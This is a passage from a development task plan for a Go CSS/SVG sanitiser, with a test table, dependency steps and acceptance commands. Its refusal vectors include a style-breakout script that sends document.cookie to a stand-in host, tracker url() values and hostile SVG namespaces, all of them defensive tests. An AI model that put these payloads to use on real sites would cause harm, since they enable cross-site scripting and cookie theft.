| `TestChecker_SVG` | `Checker.SVG(id, SanitiseSVG(id, m))` returns the same string; `Checker.SVG(b, SanitiseSVG(a, m))` returns `SanitiseSVG(b, m)` (re-prefixed, not refused); markup with `<script>` or `onload` errs (a drop is a refusal, never a repair); one row per RR-M3 rewrite: canonicalised, not refused — `<lineargradient>` (case), no root `xmlns`, a child `xmlns="http://www.w3.org/2000/svg"`; refused — root `xmlns="http://evil.example/"`, a child `xmlns="http://www.w3.org/1999/xhtml"`, a U+0001 in an attribute value (re-review RR-M3) | the authority silently repairing a bypass, or refusing every duplicate; a removal passed off as canonicalisation, or a spelling change refused |
| `TestChecker_implementsDoc` | `var _ doc.Checker = dialect.Checker{}`; `Style("margin","0")` errs | the authority checking with a different list than the parser |
| `TestTokenValue` (table, one row per token type, plus every line of **`testdata/token-accept.jsonl`, shared with task 23**) | every accept line ✓ (`font-weight: bold` and `650`, `letter-spacing: normal`, `spacing: var(--space-2)`, `line-height: 1.4`, the Inter family list, …); `color: 12px` ✗, `font-weight: 1001` ✗, `font-weight: 12px` ✗, `letter-spacing: bold` ✗; and, through `CheckDeclaration`, `opacity: bold` and `flex-grow: normal` still refused (the token rules added no keyword to a declaration rule) | a type check that accepts anything; a keyword special-cased in Go's `TokenValue` but not carried by the rule name TS reads (re-review RR-I2-1); a keyword added to the shared `RuleNumber`/`RuleLength` |
| `TestTokenValue_refusals` (table; `testdata/token-vectors.jsonl`, **shared with task 23's `allowedTokenValue.test.ts`**) | refused, each under the type its prefix names (the review's two are also refused under every other of the ten types, so no type's rule can let them through): the review's two values — `font-family: red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `font-family: url(https://tracker.example/p.png)` — and `color: URL(https://x)` and `color: Url(https://x)` (CSS function names are ASCII case-insensitive), `color: red; background: url(https://x)`, `color: red !important`, `color: url(asset:sha256-<64 hex>)` (step 3), `radius: 8px /*`, `font-family: "Inter`, `color: \72 ed`, `spacing: expression(1)`, a value holding U+000A; `font-family: attr(x)` and `font-family: var(--a)` refused by step 4 (a family list holds no function) | a token value that reaches `<style>`, `tokens.css` or `setProperty` without the checks a declaration gets (review I2) |
| `TestAllowlistJSON_upToDate` | regenerating in memory equals the committed `allowlist.json` byte for byte | the TS renderer's copy drifting from Go (task 23 checks the other side) |

## Steps

1. Add `golang.org/x/net v0.26.0` to `canvas/go.mod`. **First** copy x/net v0.26.0's two lines
   verbatim from `control-plane/go.sum` (`:133-134`, the `h1:` line and the `/go.mod` line) into a
   new `canvas/go.sum` (review M21): `go mod tidy` with `GOPROXY=off` still asks the checksum
   database about a `go.sum` line it has to add, and that is a network call the cache cannot answer
   (this device has `GOSUMDB=off`, verified 2026-09-24, so the failure shows only on a machine with
   the default). Then run `go mod tidy` inside `canvas/` with `GOFLAGS=-mod=mod GOPROXY=off` so it
   resolves from the module cache (G1). Never set `GOSUMDB=off`, `GONOSUMDB` or `GOINSECURE` to get
   past it. Afterwards every line of `canvas/go.sum` must appear verbatim in `control-plane/go.sum`;
   expected is exactly the two copied lines (x/net's own requirements are pruned: `control-plane`,
   which also requires x/net v0.26.0, records no `x/crypto v0.24.0` line). If tidy fails, or adds a
   line `control-plane/go.sum` does not hold, stop and report: the version pin is the plan's
   assumption.
2. Write the tests and fixtures. 3. Implement `css.go`, `allowlist.go`, `svg.go`, `parse.go`,
   `checker.go`, `gen.go`; run `go generate ./canvas/dialect`.
4. Run the licence gate (task 04): `x/net` must pass. Acceptance; commit by pathspec.

## Acceptance

```bash
cd /c/Users/au-dev-dmackie1/Projects/PanaceaApp/.claude/worktrees/phase-5 && go test ./canvas/dialect/... -race -count=1 && go run ./tools/licencegate -root . >/dev/null; echo "gate $?"
```
Expected: `ok  	…/canvas/dialect`, then `gate 0` (or the first-run report's known violations only).

```bash
grep -c '"margin' canvas/dialect/allowlist.json
```
Expected: `0`.

## Not claimed

- This is the first line, not the only one. The renderer re-checks (task 24) and the iframe
  sandbox and CSP are the third (task 01's S2, S6).
- Media queries, pseudo-classes and `<style>` blocks do not exist in the dialect.
- Visual fidelity of what survives is the renderer's question, not this task's.
